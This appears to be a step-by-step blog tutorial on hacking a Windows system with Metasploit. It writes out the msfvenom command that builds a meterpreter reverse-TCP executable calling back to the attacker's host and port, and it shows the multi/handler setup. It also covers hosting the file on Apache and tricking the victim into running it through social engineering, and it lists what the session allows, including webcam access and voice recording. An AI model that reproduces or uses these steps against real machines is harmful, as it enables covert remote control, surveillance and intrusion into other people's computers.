Your Step-by-Step Guide to Hacking A Windows System Using Metasploit

Before we start, let us first go through a few basic keywords that we'll require during the process!

  • IP Address: Every device on the Internet has a unique address which is required for their identification, this is the IP Address.

  • Payload: This defines an action that will be performed after successful execution of an exploit.

  • Msfvenom: It is a command that we will use to generate a payload

  • LHOST: It is the IP Address of the attacking Kali Linux machine

  • LPORT: It is the listening port which is used to build a connection from the target.


Great! Now that we've revised the basic keywords let us look into the pre-requisites

Requirements:

    ✓ Kali Linux (Either on Virtual Box or VMWare)
    ✓ Victim’s Windows System
    ✓ Metasploit Software (which will be pre-installed with Kali)
    ✓ An Internet Access

Now that we have all the requisite knowledge and tools, let's dive into the main process.


STEP 1:

Before we begin, we need to know the IP Address of our machine. To do that we open a terminal on Kali Linux and type the following command:

  • ifconfig

Here the IP Address for our machine where the interface is specified as eth0 (as we are on Ethernet).

STEP 2:

We run the following command in the terminal.

  • sudo msfvenom –p windows/meterpreter/reverse_tcp LHOST= 10.0.2.15 LPORT=4444 –f exe –o /var/www/html/file.exe

This command instructs msfvenom to generate a Windows executable file that performs a reverse TCP connection for the payload. Here, sudo gives limited root privileges to user.

  1. -p indicates it to be a payload.
  2. -f defines the format. Here it is a Windows executable with the .exe extension.
  3. -o is output. Here the command will create an output payload named file (which we’ve created in the server folder of Kali Linux)

This generates the payload as shown:

STEP 3:

Next we open the Metasploit Console using the command

  • msfconsole

We then type in the command

  • use exploit/multi/handler
This tells the Metasploit to use a generic payload handler

STEP 4:

Now since we want to attack a Windows device, we type in the following. Here, Meterpreter is the name of the payload we generated.

  1. set PAYLOAD windows/meterpreter/reverse_tcp
    2. This sets the PAYLOAD such that it matches with the one set in the executable.
  2. To set the LHOST we follow it up with, set LHOST 10.0.2.15
  3. set LPORT 4444
    4. This command sets the LPORT.
After typing in the above commands, we get to see the following screen:


In order to check if we've entered all the commands correctly , we can type
  • show options


When all the settings have been checked, we type exploit in the console.


STEP 5:

We now need to start the server in Kali Linux. For that we type:

  • sudo service apache2 start

Now, through the use of Social Engineering we need to somehow deliver the payload file to the target PC. Here, we will be downloading it from the built-in server. For that, we type in our IP Address10.0.2.15/ (as per our example)

We click on the link, and the file is downloaded. Upon execution of our file, we’ll see that a session has been opened. We are offered many options that can be performed on the PC. For example, we type
  • sysinfo


This particular command displays all the system information about the target PC. However, there are many other options that we can choose from. It has options that let us open webcams, close applications, record voice and many more.
